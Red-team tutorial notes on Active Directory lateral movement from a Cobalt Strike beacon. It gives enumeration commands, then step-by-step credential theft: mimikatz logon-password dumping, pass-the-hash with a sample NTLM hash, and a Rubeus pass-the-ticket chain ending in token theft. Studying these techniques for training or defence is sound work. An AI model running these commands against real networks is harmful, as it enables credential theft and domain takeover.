# How to know and become someone else >:)

After elevating access on a Workstation, we should do some domain recon to see where we may be able to leverage them.
Being System on a service is mandatory in order to steal password using ```mimikatz``` and to perform user impersonation with _pass the hash, pass the ticket, overpass the hash, token impersonation and process injection. _
So, become SYSTEM on a workstation is mandatory to perform some action, but be able to impersonate someone who has access to more (even all!) systems inside an AD (like a user from the admin group) is way more important.
## Enumeration is the first step
We could enumerate from the current domain as a standard domain user initially with
- **PowerView**
```
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
```
- **SharpView**
```
beacon> execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-Domain
```
- **ADSearch**
```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "objectCategory=user"
```

We would know from our domain recon who is a **local administrator** on multiple computers via his **membership** and get credential materials like NTLM hash, AES256 hash and a Kerberos TGT.

### Pass the Hash
The **Pass the Hash** technique is done using the NTLM hash. That can be retrieved with mimikatz 
```
beacon> mimikatz !sekurlsa::logonpasswords
```
and then perform the action
```
beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c
```
### Pass the Ticket
Pass the ticket is a technique that allows you add Kerberos tickets to a logon session (LUID)
with ```Rubeus triage``` you can extract Kerberos tickets
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
```
with Rubeus
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt
```
This will output the ticket in base64 encoded format.
At this point, we want to create a blank, "sacrificial" logon session that we can pass the TGT into.
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
```
The next step is to pass the TGT into this new LUID using the Rubeus ptt command.  Where the /luid is the new LUID we just created and /ticket is the base64 encoded ticket we previously extracted.
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP
```
The final step is to impersonate the process that we created with _createnetonly_ using Cobalt Strike's ```steal_token``` command.
